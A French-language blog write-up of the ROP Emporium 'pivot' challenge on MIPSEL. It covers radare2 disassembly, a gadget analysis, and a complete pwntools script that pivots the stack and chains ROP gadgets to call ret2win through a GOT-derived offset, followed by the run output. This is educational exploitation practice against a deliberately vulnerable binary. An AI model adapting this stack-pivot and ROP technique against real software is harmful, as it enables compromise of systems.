---
Title: Ropemporium mipsel pivot
Date: 2023-07-07
Tags: [linux, python, ROP, fluff, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# pivot mipsel

## Introduction.

Le pitch et le matériel de cet exercie se trouve sur cette page du site ropemporium :

[pivot](https://ropemporium.com/challenge/pivot.html)

Dans cet exercice le message vulnérable au débordement ne permet pas comme pécédemment d'envoyer une chaine de ROP très longue.


## Découverte

### Contenu du challenge

    -rw-r--r-- 1 jce jce    33 15 juil.  2020 flag.txt
    -rwxr-xr-x 1 jce jce 12144 16 juil.  2020 libpivot_mipsel.so
    -rwxr-xr-x 1 jce jce 12412 16 juil.  2020 pivot_mipsel

### Execution 

    $ ./pivot_mipsel 
    pivot by ROP Emporium
    MIPS

    Call ret2win() from libpivot
    The Old Gods kindly bestow upon you a place to pivot: 0x3fe00f08
    Send a ROP chain now and it will land there
    > aaaaaaaaa
    Thank you!

    Now please send your stack smash
    > bbbbbbbbbbbbbbbbbbbbb
    Thank you!

    Exiting


Le programme nous donne une adresse annoncée comme celle où pivolter la pile, puis un message pour envoyer une chaine de ROP et un message de débordement.


## Analyse

### Le progamme principal

On observe les binaires avec radare2

    radare2 -A pivot_mipsel

Les reférences intéressantes sont :

    fs symbols
    f
    ...
    0x00400980 340 sym.main
    0x00400ad4 392 sym.pwnme
    0x00400c5c 136 sym.uselessFunction
    0x00400ca0 0 loc.usefulGadgets
    ...

La fonction vulnérables est dans le programme principal


La fontion `uselessFunction`

LA fonction vulnérable :

    ┌ 392: sym.pwnme (int32_t arg1, int32_t arg3, int32_t arg_10h, int32_t arg_18h, int32_t arg_40h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; arg int32_t arg_18h @ fp+0x18
    │           ; arg int32_t arg_40h @ fp+0x40     ; adresse pivot
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_38h @ sp+0x38
    │           ; var int32_t var_3ch @ sp+0x3c
    │           ; arg int32_t arg1 @ a0
    │           ; arg int32_t arg3 @ a2
    │           0x00400ad4      c0ffbd27       addiu sp, sp, -0x40
    │           0x00400ad8      3c00bfaf       sw ra, (var_3ch)
    │           0x00400adc      3800beaf       sw fp, (var_38h)
    │           0x00400ae0      25f0a003       move fp, sp
    │           0x00400ae4      42001c3c       lui gp, 0x42                ; 'B'
    │           0x00400ae8      10a09c27       addiu gp, gp, -0x5ff0
    │           0x00400aec      1000bcaf       sw gp, (var_10h)
    │           0x00400af0      4000c4af       sw a0, (arg_40h)            ; adresse pivot passée en agument
    │           0x00400af4      20000624       addiu a2, zero, 0x20        ; arg3
    │           0x00400af8      25280000       move a1, zero
    │           0x00400afc      1800c227       addiu v0, fp, 0x18
    │           0x00400b00      25204000       move a0, v0
    │           0x00400b04      4480828f       lw v0, -sym.imp.memset(gp)  ; [0x412054:4]=0x400e90 sym.imp.memset
    │           0x00400b08      25c84000       move t9, v0
    │           0x00400b0c      09f82003       jalr t9
    │           0x00400b10      00000000       nop
    │           0x00400b14      1000dc8f       lw gp, (var_10h)
    │           0x00400b18      4000023c       lui v0, 0x40                ; '@'
    │           0x00400b1c      640f4424       addiu a0, v0, 0xf64         ; 0x400f64 ; "Call ret2win() from libpivot" 
    │           0x00400b20      5c80828f       lw v0, -sym.imp.puts(gp)    ; [0x41206c:4]=0x400e40 sym.imp.puts ; "@\x0e@"
    │           0x00400b24      25c84000       move t9, v0
    │           0x00400b28      09f82003       jalr t9
    │           0x00400b2c      00000000       nop                         ; affichage de l'adresse pivot
    │           0x00400b30      1000dc8f       lw gp, (var_10h)
    │           0x00400b34      4000c58f       lw a1, (arg_40h)            ; adresse pivot
    │           0x00400b38      4000023c       lui v0, 0x40                ; '@'
    │           0x00400b3c      840f4424       addiu a0, v0, 0xf84         ; 0x400f84 ; "The Old Gods kindly bestow upon you a place to pivot: %p\n" 
    │           0x00400b40      6880828f       lw v0, -sym.imp.printf(gp)  ; [0x412078:4]=0x400e10 sym.imp.printf
    │           0x00400b44      25c84000       move t9, v0
    │           0x00400b48      09f82003       jalr t9
    │           0x00400b4c      00000000       nop
    │           0x00400b50      1000dc8f       lw gp, (var_10h)
    │           0x00400b54      4000023c       lui v0, 0x40                ; '@'
    │           0x00400b58      c00f4424       addiu a0, v0, 0xfc0         ; 0x400fc0 ; "Send a ROP chain now and it will land there"
    │           0x00400b5c      5c80828f       lw v0, -sym.imp.puts(gp)    ; [0x41206c:4]=0x400e40 sym.imp.puts ; "@\x0e@"
    │           0x00400b60      25c84000       move t9, v0
    │           0x00400b64      09f82003       jalr t9
    │           0x00400b68      00000000       nop
    │           0x00400b6c      1000dc8f       lw gp, (var_10h)
    │           0x00400b70      4000023c       lui v0, 0x40                ; '@'
    │           0x00400b74      ec0f4424       addiu a0, v0, 0xfec         ; arg1 ; esilref: '> '
    │           0x00400b78      6880828f       lw v0, -sym.imp.printf(gp)  ; [0x412078:4]=0x400e10 sym.imp.printf
    │           0x00400b7c      25c84000       move t9, v0
    │           0x00400b80      09f82003       jalr t9
    │           0x00400b84      00000000       nop                         ; lecture de 512 octets vers l'adresse pivot
    │           0x00400b88      1000dc8f       lw gp, (var_10h)
    │           0x00400b8c      00010624       addiu a2, zero, 0x100       ; 512
    │           0x00400b90      4000c58f       lw a1, (arg_40h)            ;  adresse pivot
    │           0x00400b98      7080828f       lw v0, -sym._MIPS_STUBS_(gp) ; sym.imp.read
    │           0x00400b9c      25c84000       move t9, v0
    │           0x00400ba0      09f82003       jalr t9
    │           0x00400ba4      00000000       nop
    │           0x00400ba8      1000dc8f       lw gp, (var_10h)
    │           0x00400bac      4000023c       lui v0, 0x40                ; '@'
    │           0x00400bb0      f00f4424       addiu a0, v0, 0xff0         ; 0x400ff0 ; "Thank you!\n" ; arg1 ; str.Thank_you__n
    │           0x00400bb4      5c80828f       lw v0, -sym.imp.puts(gp)    ; [0x41206c:4]=0x400e40 sym.imp.puts ; "@\x0e@"
    │           0x00400bb8      25c84000       move t9, v0
    │           0x00400bbc      09f82003       jalr t9
    │           0x00400bc0      00000000       nop
    │           0x00400bc4      1000dc8f       lw gp, (var_10h)
    │           0x00400bc8      4000023c       lui v0, 0x40                ; '@'
    │           0x00400bcc      fc0f4424       addiu a0, v0, 0xffc         ; 0x400ffc ; "Now please send your stack smash" 
    │           0x00400bd0      5c80828f       lw v0, -sym.imp.puts(gp)    ; [0x41206c:4]=0x400e40 sym.imp.puts ; "@\x0e@"
    │           0x00400bd4      25c84000       move t9, v0
    │           0x00400bd8      09f82003       jalr t9
    │           0x00400bdc      00000000       nop
    │           0x00400be0      1000dc8f       lw gp, (var_10h)
    │           0x00400be4      4000023c       lui v0, 0x40                ; '@'
    │           0x00400be8      ec0f4424       addiu a0, v0, 0xfec         ; arg1 ; esilref: '> '
    │           0x00400bec      6880828f       lw v0, -sym.imp.printf(gp)  ; [0x412078:4]=0x400e10 sym.imp.printf
    │           0x00400bf0      25c84000       move t9, v0
    │           0x00400bf4      09f82003       jalr t9
    │           0x00400bf8      00000000       nop
    │           0x00400bfc      1000dc8f       lw gp, (var_10h)
    │           0x00400c00      28000624       addiu a2, zero, 0x28        ; arg3
    │           0x00400c04      1800c227       addiu v0, fp, 0x18
    │           0x00400c08      25284000       move a1, v0
    │           0x00400c0c      25200000       move a0, zero
    │           0x00400c10      7080828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x412080:4]=0x400e00 sym.imp.read
    │           0x00400c14      25c84000       move t9, v0
    │           0x00400c18      09f82003       jalr t9
    │           0x00400c1c      00000000       nop
    │           0x00400c20      1000dc8f       lw gp, (var_10h)
    │           0x00400c24      4000023c       lui v0, 0x40                ; '@'
    │           0x00400c28      20104424       addiu a0, v0, 0x1020        ; 0x401020 ; "Thank you!" ; arg1 ; str.Thank_you_
    │           0x00400c2c      5c80828f       lw v0, -sym.imp.puts(gp)    ; [0x41206c:4]=0x400e40 sym.imp.puts ; "@\x0e@"
    │           0x00400c30      25c84000       move t9, v0
    │           0x00400c34      09f82003       jalr t9
    │           0x00400c38      00000000       nop
    │           0x00400c3c      1000dc8f       lw gp, (var_10h)
    │           0x00400c40      00000000       nop
    │           0x00400c44      25e8c003       move sp, fp
    │           0x00400c48      3c00bf8f       lw ra, (var_3ch)
    │           0x00400c4c      3800be8f       lw fp, (var_38h)
    │           0x00400c50      4000bd27       addiu sp, sp, 0x40
    │           0x00400c54      0800e003       jr ra
    └           0x00400c58      00000000       nop

La fonction vulnérable attend en paramètre l'adresse pivot située dans le bloc alloué par la fonction main.
Elle nous affiche cette adresse.
Elle effectue une lecture de 512 octets sur stdin vers cette adrese pivot
Ensuite elle effecture une seconde lecture vulnérable.

Le second appel de la fonction read fait

    │           0x00400c00      28000624       addiu a2, zero, 0x28        ; taille 40
    │           0x00400c04      1800c227       addiu v0, fp, 0x18
    │           0x00400c08      25284000       move a1, v0
    │           0x00400c0c      25200000       move a0, zero
    │           0x00400c10      7080828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x412080:4]=0x400e00 sym.imp.read
    │           0x00400c14      25c84000       move t9, v0
    │           0x00400c18      09f82003       jalr t9

- le débordement se fait à partir de 0x24 (36) octets
- la taille du message lu est 0x28 (40) octets.

On de dispose donc que d'un mot pour pivoter la pile.


    pdf @ sym.uselessFunction
    ┌ 136: sym.uselessFunction (int32_t arg1, int32_t arg_10h, int32_t arg_4h, int32_t arg_8h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; var int32_t var_4h @ sp+0x4
    │           ; var int32_t var_8h @ sp+0x8
    │           ; var int32_t var_ch @ sp+0xc
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_8h_2 @ sp+0x14
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           ; arg int32_t arg_4h @ sp+0x20
    │           ; arg int32_t arg_8h @ sp+0x24
    │           ; arg int32_t arg1 @ a0
    │           0x00400c5c      e0ffbd27       addiu sp, sp, -0x20
    │           0x00400c60      1c00bfaf       sw ra, (var_1ch)
    │           0x00400c64      1800beaf       sw fp, (var_18h)
    │           0x00400c68      25f0a003       move fp, sp
    │           0x00400c6c      42001c3c       lui gp, 0x42                
    │           0x00400c70      10a09c27       addiu gp, gp, -0x5ff0
    │           0x00400c74      1000bcaf       sw gp, (var_10h)
    │           0x00400c78      5080828f       lw v0, -sym.imp.foothold_function(gp) ; [0x412060:4]=0x400e60 sym.imp.foothold_function ; "`\x0e@"
    │           0x00400c7c      25c84000       move t9, v0
    │           0x00400c80      09f82003       jalr t9
    │           0x00400c84      00000000       nop
    │           0x00400c88      1000dc8f       lw gp, (var_10h)
    │           0x00400c8c      01000424       addiu a0, zero, 1           ; arg1
    │           0x00400c90      5480828f       lw v0, -sym.imp.exit(gp)    ; [0x412064:4]=0x400e50 sym.imp.exit ; "P\x0e@"
    │           0x00400c94      25c84000       move t9, v0
    │           0x00400c98      09f82003       jalr t9

Cette fonction n'est pas utilisée mais reférence une fonction `foothold_function`, la rendant accessible en en créant une référence dans les tables PLT et GOT

Dans le programme on trouve aussi des gadgets 
Remarque. Avec radare2, affichez les gadgets sans préalablement avoir effectué l'analyse afin d'éviter l'interpretation des variables ce qui donné des choses comme :

    ; var int32_t var_8h_2 @ sp+0x14
    0x00400cb0      0800b98f       lw t9, (var_8h_2)


    [0x004007e0]> s loc.usefulGadgets
    [0x00400ca0]> pd 20
            ;-- usefulGadgets:
            0x00400ca0      0800b98f       lw t9, 8(sp)
            0x00400ca4      0400a88f       lw t0, 4(sp)
            0x00400ca8      09f82003       jalr t9
            0x00400cac      0c00bd27       addiu sp, sp, 0xc
            0x00400cb0      0800b98f       lw t9, 8(sp)
            0x00400cb4      0400aa8f       lw t2, 4(sp)
            0x00400cb8      0000498d       lw t1, (t2)
            0x00400cbc      09f82003       jalr t9
            0x00400cc0      0c00bd27       addiu sp, sp, 0xc
            0x00400cc4      20c80901       add t9, t0, t1
            0x00400cc8      09f82003       jalr t9
            0x00400ccc      0400bd27       addiu sp, sp, 4
            0x00400cd0      25e8c003       move sp, fp
            0x00400cd4      0800bf8f       lw ra, 8(sp)
            0x00400cd8      0400be8f       lw fp, 4(sp)
            0x00400cdc      0800e003       jr ra
            0x00400ce0      0c00bd27       addiu sp, sp, 0xc





Analyse des gadgets

**chargement de `t0` et `t9` puis call `t9`**
- lw t9, 8(sp)
- lw t0, 4(sp)
- jalr t9
- addiu sp, sp, 0xc

**Lecture dans `t1` du contenu d'une adresse puis call**
- lw t9, 8(sp)
- lw t2, 4(sp)
- lw t1, (t2)
- jalr t9
- addiu sp, sp, 0xc

**call t0+t1**
- add t9, t0, t1
- jalr t9
- addiu sp, sp, 4

**pivote la pile** 
- move sp, fp   ; pivote : sp <= fp
- lw ra, 8(sp)  ; charge ra avec sp[2]
- lw fp, 4(sp)  ; charge fp avec sp[1]
- jr ra              ; jump ra 
- addiu sp, sp, 0xc  ; sp=sp+12


### La librairie libpivot_mipsel.so

La librairie contient essentiellement deux fonctions qui nous intéressent:

    0x000009c0 88 sym.foothold_function
    0x00000d38 264 sym.ret2win

ret2win est la fonction a appeller mais nous ne connaissons pas son adresse et elle n'est pas référencée par le programme principal.
En revanche nous connaisson la distance relative entre les deux fonctions : 0x00000d38 - 0x000009c0 = 0x378

Or la fonction foothold_function elle est référencée dans le programme.
Avec  l'adresse de foothold_function on peut calculer cette de ret2win en ajoutant 0x378


    ┌ 88: sym.foothold_function (int32_t arg1, int32_t arg_10h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; var int32_t var_10h @ sp+0x10
    │           ; var int32_t var_18h @ sp+0x18
    │           ; var int32_t var_1ch @ sp+0x1c
    │           ; arg int32_t arg1 @ a0
    │           0x000009c0      02001c3c       lui gp, 2
    │           0x000009c4      30969c27       addiu gp, gp, -0x69d0
    │           0x000009c8      21e09903       addu gp, gp, t9
    │           0x000009cc      e0ffbd27       addiu sp, sp, -0x20
    │           0x000009d0      1c00bfaf       sw ra, (var_1ch)
    │           0x000009d4      1800beaf       sw fp, (var_18h)
    │           0x000009d8      25f0a003       move fp, sp
    │           0x000009dc      1000bcaf       sw gp, (var_10h)
    │           0x000009e0      2880828f       lw v0, -0x7fd8(gp)          ; [0x12018:4]=0
    │           0x000009e4      500f4424       addiu a0, v0, str.foothold_function__:_Check_out_my_.got.plt_entry_to_gain_a_foothold_into_libpivot ; 0xf50 ; "foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot" ; arg1
    │           0x000009e8      4880828f       lw v0, -sym.imp.puts(gp)    ; [0x12038:4]=0xec0 sym.imp.puts
    │           0x000009ec      25c84000       move t9, v0
    │           0x000009f0      09f82003       jalr t9
    │           0x000009f4      00000000       nop
    │           0x000009f8      1000dc8f       lw gp, (var_10h)
    │           0x000009fc      00000000       nop
    │           0x00000a00      25e8c003       move sp, fp
    │           0x00000a04      1c00bf8f       lw ra, (var_1ch)
    │           0x00000a08      1800be8f       lw fp, (var_18h)
    │           0x00000a0c      2000bd27       addiu sp, sp, 0x20
    │           0x00000a10      0800e003       jr ra
    └           0x00000a14      00000000       nop


    ┌ 264: sym.ret2win (int32_t arg1, int32_t arg2, int32_t arg_10h, int32_t arg_1ch, int32_t arg_20h, int32_t arg_44h);
    │           ; arg int32_t arg_10h @ fp+0x10
    │           ; arg int32_t arg_1ch @ fp+0x1c
    │           ; arg int32_t arg_20h @ fp+0x20
    │           ; arg int32_t arg_44h @ fp+0x44
    │           ; var int32_t var_10h_2 @ sp+0x10
    │           ; var int32_t var_48h @ sp+0x48
    │           ; var int32_t var_4ch @ sp+0x4c
    │           ; arg int32_t arg1 @ a0
    │           ; arg int32_t arg2 @ a1
    │           0x00000d38      02001c3c       lui gp, 2
    │           0x00000d3c      b8929c27       addiu gp, gp, -0x6d48
    │           0x00000d40      21e09903       addu gp, gp, t9
    │           0x00000d44      b0ffbd27       addiu sp, sp, -0x50
    │           0x00000d48      4c00bfaf       sw ra, (var_4ch)
    │           0x00000d4c      4800beaf       sw fp, (var_48h)
    │           0x00000d50      25f0a003       move fp, sp
    │           0x00000d54      1000bcaf       sw gp, (var_10h_2)
    │           0x00000d58      5080828f       lw v0, -0x7fb0(gp)          ; [0x12040:4]=0
    │           0x00000d5c      0000428c       lw v0, (v0)
    │           0x00000d60      4400c2af       sw v0, (arg_44h)
    │           0x00000d64      1c00c0af       sw zero, (arg_1ch)
    │           0x00000d68      2880828f       lw v0, -0x7fd8(gp)          ; [0x12018:4]=0
    │           0x00000d6c      b80f4524       addiu a1, v0, 0xfb8         ; arg2
    │           0x00000d70      2880828f       lw v0, -0x7fd8(gp)          ; [0x12018:4]=0
    │           0x00000d74      bc0f4424       addiu a0, v0, str.flag.txt  ; 0xfbc ; "flag.txt" ; arg1
    │           0x00000d78      5480828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x12044:4]=0xea0 sym.imp.fopen
    │           0x00000d7c      25c84000       move t9, v0
    │           0x00000d80      09f82003       jalr t9
    │           0x00000d84      00000000       nop
    │           0x00000d88      1000dc8f       lw gp, (var_10h_2)
    │           0x00000d8c      1c00c2af       sw v0, (arg_1ch)
    │           0x00000d90      1c00c28f       lw v0, (arg_1ch)
    │       ┌─< 0x00000d94      0d004014       bnez v0, 0xdcc
    │       │   0x00000d98      00000000       nop
    │       │   0x00000d9c      2880828f       lw v0, -0x7fd8(gp)          ; [0x12018:4]=0
    │       │   0x00000da0      c80f4424       addiu a0, v0, str.Failed_to_open_file:_flag.txt ; 0xfc8 ; "Failed to open file: flag.txt" ; arg1
    │       │   0x00000da4      4880828f       lw v0, -sym.imp.puts(gp)    ; [0x12038:4]=0xec0 sym.imp.puts
    │       │   0x00000da8      25c84000       move t9, v0
    │       │   0x00000dac      09f82003       jalr t9
    │       │   0x00000db0      00000000       nop
    │       │   0x00000db4      1000dc8f       lw gp, (var_10h_2)
    │       │   0x00000db8      01000424       addiu a0, zero, 1           ; arg1
    │       │   0x00000dbc      4080828f       lw v0, -sym.imp.exit(gp)    ; [0x12030:4]=0xed0 sym.imp.exit
    │       │   0x00000dc0      25c84000       move t9, v0
    │       │   0x00000dc4      09f82003       jalr t9
    │       │   0x00000dc8      00000000       nop
    │       │   ; CODE XREF from sym.ret2win @ 0xd94
    │       └─> 0x00000dcc      2000c227       addiu v0, fp, 0x20
    │           0x00000dd0      1c00c68f       lw a2, (arg_1ch)
    │           0x00000dd4      21000524       addiu a1, zero, 0x21        ; arg2
    │           0x00000dd8      25204000       move a0, v0
    │           0x00000ddc      4c80828f       lw v0, -sym.imp.fgets(gp)   ; [0x1203c:4]=0xeb0 sym.imp.fgets
    │           0x00000de0      25c84000       move t9, v0
    │           0x00000de4      09f82003       jalr t9
    │           0x00000de8      00000000       nop
    │           0x00000dec      1000dc8f       lw gp, (var_10h_2)
    │           0x00000df0      2000c227       addiu v0, fp, 0x20
    │           0x00000df4      25204000       move a0, v0
    │           0x00000df8      4880828f       lw v0, -sym.imp.puts(gp)    ; [0x12038:4]=0xec0 sym.imp.puts
    │           0x00000dfc      25c84000       move t9, v0
    │           0x00000e00      09f82003       jalr t9
    │           0x00000e04      00000000       nop
    │           0x00000e08      1000dc8f       lw gp, (var_10h_2)
    │           0x00000e0c      1c00c48f       lw a0, (arg_1ch)
    │           0x00000e10      3c80828f       lw v0, -sym.imp.fclose(gp)  ; [0x1202c:4]=0xee0 sym.imp.fclose
    │           0x00000e14      25c84000       move t9, v0
    │           0x00000e18      09f82003       jalr t9
    │           0x00000e1c      00000000       nop
    │           0x00000e20      1000dc8f       lw gp, (var_10h_2)
    │           0x00000e24      1c00c0af       sw zero, (arg_1ch)
    │           0x00000e28      25200000       move a0, zero
    │           0x00000e2c      4080828f       lw v0, -sym.imp.exit(gp)    ; [0x12030:4]=0xed0 sym.imp.exit
    │           0x00000e30      25c84000       move t9, v0
    │           0x00000e34      09f82003       jalr t9
    │           0x00000e38      00000000       nop
    └           0x00000e3c      00000000       nop


## Construction de l'attaque

### Pivoter la pile

Pour pivoter la pile on utilise le gadget

    0x00400cd4 move sp, fp; lw ra, 8(sp); lw fp, 4(sp); jr ra; addiu sp, sp, 0xc

- move sp, fp   ; pivote : sp <= fp
- lw ra, 8(sp)  ; charge ra avec sp[2]
- lw fp, 4(sp)  ; charge fp avec sp[1]
- jr ra              ; jump ra 
- addiu sp, sp, 0xc  ; sp=sp+12

On peut maitriser la valeur initiale de `sp`.

Pour cela il faut rappeller ce qui se passe à l'épilogue de pwnme.

    │           0x00400c48      3c00bf8f       lw ra, (var_3ch)
    │           0x00400c4c      3800be8f       lw fp, (var_38h)
    │           0x00400c50      4000bd27       addiu sp, sp, 0x40
    │           0x00400c54      0800e003       jr ra
    └           0x00400c58      00000000       nop

Juste avant je saut final, on a restoré les valeurs de fp et ra présentes sur la pile et donc écrasées par notre message qui aurra cette forme :

[pad de 32 octets][fp][ra][gadget pivot]

La chaine de ROP pour le pivot, après une message de débordement jusqu'à la sauvegarde de fp : 0x20 octets.

| ROP entry | gadget | comment |
| ----------- | ------- | ----- |
| leak | leak | adresse de la chaine d'exploitation qui sera restorée dans fp 
| 0x00400cd4 | move sp, fp; lw ra, 8(sp); lw fp, 4(sp); jr ra; addiu sp, sp, 0xc | pivot

Attention, la permière instruction  `move sp, fp` bascule la pile. Mais ensuite les deux suivantes font réalisées.
ra et fp sont lus sur la nouvelle pile qui doit commencer par :

- un junk (n'importe quoi) pour que la suite soit en sp+4
- une valeur pour fp
- une adresse pour ra : le premier gadget de le chaine



### Appeller ret2win

La chaine d'exploitation principale doit appeller la fonction `ret2win`.

Pour cela on va appeller la fonction située à l'adresse de `foothold_function` dans la GOT + l'offset entre `foothold_function` et `ret2win` calculé précédement : 0x378 (888).

La gadget

    0x00400cc4 : add $t9, $t0, $t1 ; jalr $t9 ; addiu $sp, $sp, 4

nous permet cet appel en effectuant un call(t0+t1). 

Il nous faut préalablement charger l'adresse de foothold_function et 888 dans ces deux registres

Le gadget suivant permet de charger t1 avec le contenu d'une adresse mémoire

     0x00400cb0 : lw $t9, 8($sp) ; lw $t2, 4($sp) ; lw $t1, ($t2) ; jalr $t9 ; addiu $sp, $sp, 0xc

Son usage :
    - jump 0x00400cb0 
    - junk car on a rien a mettre dans ($sp)
    - adresse foothold_function@got
    - adresse du prochain gadget pour t9

Ensuite pour charger 888 dans t0 on a : 

    0x00400ca0 : lw $t9, 8($sp) ; lw $t0, 4($sp) ; jalr $t9 ; addiu $sp, $sp, 0xc

    - jump 0x00400ca0 
    - junk car on a rien a mettre dans ($sp)
    - 888
    - adresse du prochain gadget pour t9

Préalabelement il faut encore avoir appelé une première fois `foothold_function` pour que son adresse soit présente dans la pile.
On peut réaliser cet appel avec le gadget qui permet de charget t0 et d'appeller un fonction.

    0x00400ca0 : lw $t9, 8($sp) ; lw $t0, 4($sp) ; jalr $t9 ; addiu $sp, $sp, 0xc

    - jump 0x00400ca0 
    - junk car on a rien a mettre dans ($sp)
    - une valeur junk pour t0
    - foothold_function@plt pour t9


La chaine de ROP à poster dans le premier message est donc construite dans l'ordre inverse de la description qui vien d'être faite.

Un dernier détail, ne pas oublier que la chaine doit commence par deux valeurs de junk consommés par le pivot, comme dit plus haut.

### La chaine de ROP d'exploitation

| ROP entry | gadget | comment |
| ----------- | ------- | ----- |
| 0xaaaaaaaa | junk | 
| leak+0x200 | junk | pour fp
| ---------- | Appel de foothold_function |
| 0x00400ca0 | lw $t9, 8($sp) ; lw $t0, 4($sp) ; jalr $t9 ; addiu $sp, $sp, 0xc | call foothold_function
| 0xdeadbeef | junk | 
| 0x00000000 | junk | pour t0 inutile 
| 0x00000e60 | foothold.plt | foothold pour t9  
| ---------- | Lecture de la GOT |
| 0x00400cb0 | lw $t9, 8($sp) ; lw $t2, 4($sp) ; lw $t1, ($t2) ; jalr $t9 ; addiu $sp, $sp, 0xc| Lecture dans t1
| 0x00000e60 | foothold.plt | foothold  
| ---------- | Chargement de t0 avec 888 |
| 0x00400ca0 | lw $t9, 8($sp) ; lw $t0, 4($sp) ; jalr $t9 ; addiu $sp, $sp, 0xc | Chargement de t0
| 0xdeadbeef | junk | 
| 0x00000378 | 888 | offset de ret2win  
| ---------- | call t0+t1 |
| 0x00400cc4 | add $t9, $t0, $t1 ; jalr $t9 ; addiu $sp, $sp, 4| chargé dans le t9 du gadget précédent

## Exploitation

### Le script python

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time


# ROPemporium pivot MIPSEL

# Set up pwntools for the correct architecture
elf = context.binary = ELF('pivot_mipsel')
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

# ret : 284
gs='''
b *pwnme+372
c
'''

# References ELF du programme
main=elf.symbols['main']
useless_func=elf.symbols['uselessFunction']
got_foothold=elf.got['foothold_function']
plt_foothold=elf.plt['foothold_function']
puts=elf.symbols['puts']
pwnme=elf.symbols['pwnme']
data = elf.get_section_by_name('.data').header['sh_addr']

# References ELF de la librairie
libelf = ELF('libpivot_mipsel.so')

lib_foothold = libelf.symbols['foothold_function']
lib_ret2win = libelf.symbols['ret2win']
off_ret2win=lib_ret2win-lib_foothold


# Gadgets
# Read address to t1 and call
# 0x00400cb0 : lw $t9, 8($sp) ; lw $t2, 4($sp) ; lw $t1, ($t2) ; jalr $t9 ; addiu $sp, $sp, 0xc
g_read_addr_and_call = 0x00400cb0

# Load t0 and call t9
# 0x00400ca0 : lw $t9, 8($sp) ; lw $t0, 4($sp) ; jalr $t9 ; addiu $sp, $sp, 0xc
g_load_t0_and_call = 0x00400ca0

# Call t0+t1
# 0x00400cc4 : add $t9, $t0, $t1 ; jalr $t9 ; addiu $sp, $sp, 4
g_call_t0t1 = 0x00400cc4

# move sp, fp; lw ra, (sp+8); lw fp, (sp+4); jr ra; addiu sp, sp, 0xc
g_pivot = 0x00400cd0



if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


bssaddr = elf.get_section_by_name('.bss').header['sh_addr']

# Premier message
# ETAPE 0 : lecture de l'adresse leak
io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
leak = int(leak,16)
log.info(f"got_foothold   = 0x{got_foothold:x}")
log.info(f"leak           = 0x{leak:x}")
log.info(f"adr ret2win    = 0x{lib_ret2win:x}")
log.info(f"adr foothold   = 0x{lib_foothold:x}")
log.info(f"offset ret2win = 0x{off_ret2win:x}")
log.info(f".bss address   = 0x{bssaddr=:x}")

log.info("Message 1")
# MESSAGE 1
# ROP chaine d'exploitation

# sp will be set to leak-4
PL=p32(0xbbbbbbbb)         # junk
PL+=p32(leak-0x200)          # pour fp
PL+=p32(g_load_t0_and_call) # pour ra du gadget pivot
# Call foothold
PL+=p32(0xdeadbeef)         # junk
PL+=p32(off_ret2win)        # t0 inutile ici
PL+=p32(plt_foothold)       # pour t9

# read got to t1
PL+=p32(g_read_addr_and_call) # pour ra
PL+=p32(got_foothold)       # 

# load t0 with offset btw foothold and ret2win
PL+=p32(g_load_t0_and_call) # next gadget
PL+=p32(0xbbbbbbbb)         # junk
PL+=p32(off_ret2win)        # offset 

PL+=p32(g_call_t0t1)        # call (t0+t1)

io.sendlineafter(b"> ",PL)

log.info("ETAPE 1 / pivot")
# MESSAGE 2 : pivot
# Offset avant ecrasement de l'adresse de la sauvagarde de sp
offset=0x20

PL =b"A"*offset
PL+=p32(leak)                 # Va dans fp
# move sp, fp; lw ra, (sp+8); lw fp, (sp+4); jr ra; addiu sp, sp, 0xc
PL+=p32(g_pivot)              # sp <= fp ; ra <= [leak+4]; fp <= [leak]; jr ra

log.info(f"Payload size : 0x{len(PL):x}")
log.info(PL.hex())
io.sendlineafter(b"> ",PL)

'''
# This line is read by prio gadget
PL+=p32(g_call_with_a0)    # t9 => next gadget for g_write_s1s0
PL+=p32(0xdeadbeef)        # junk
PL+=p32(print_file)        # t9 for g_call_with_a0
PL+=p32(bssaddr)           # t0 for g_call_with_a0
'''

io.interactive()
io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()
```

### Déroulement

    [*] '/w/ropemporium/mipsel/07_pivot/pivot_mipsel'
        Arch:     mips-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        RUNPATH:  b'.'
    [*] '/w/ropemporium/mipsel/07_pivot/libpivot_mipsel.so'
        Arch:     mips-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [+] Starting local process '/w/ropemporium/mipsel/07_pivot/pivot_mipsel': pid 106
    [*] got_foothold   = 0x412060
    [*] leak           = 0x3fda6f08
    [*] adr ret2win    = 0xd38
    [*] adr foothold   = 0x9c0
    [*] offset ret2win = 0x378
    [*] .bss address   = 0xbssaddr=412090
    [*] Message 1
    [*] ETAPE 1 / pivot
    [*] Payload size : 0x28
    [*] 4141414141414141414141414141414141414141414141414141414141414141086fda3fd00c4000
    [*] Switching to interactive mode
    Thank you!
    foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive

## Annexe

Pour localiser la PLT avec radare2. On peut par exemple afficher les segments et filtrer les reférences "imp".

    [0x00400c5c]> is~imp.
    15  ---------- 0x00000000 WEAK   NOTYPE 16       imp._ITM_registerTMCloneTable
    16  ---------- 0x00000000 GLOBAL OBJ    16       imp.stdout
    17  0x00000e90 0x00400e90 GLOBAL FUNC   16       imp.memset
    18  0x00000e80 0x00400e80 GLOBAL FUNC   16       imp.setvbuf
